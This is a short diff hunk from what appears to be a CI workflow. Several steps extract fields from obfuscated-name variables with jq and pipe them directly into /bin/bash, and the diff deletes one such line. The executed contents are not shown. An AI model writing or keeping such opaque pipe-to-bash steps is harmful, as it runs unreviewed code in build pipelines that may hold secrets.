@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$nt0354" | jq -r .ph1 | /bin/bash
           printf '%s' "$jr232" | jq -r .poute444 | /bin/bash
           echo $rugng8150 | jq -r .r02719 | /bin/bash
-          echo $er8259 | jq -r .ghil53 | /bin/bash
           printf '%s' "$fpm1" | jq -r .bk8 | /bin/bash
 
       - name: Persist results
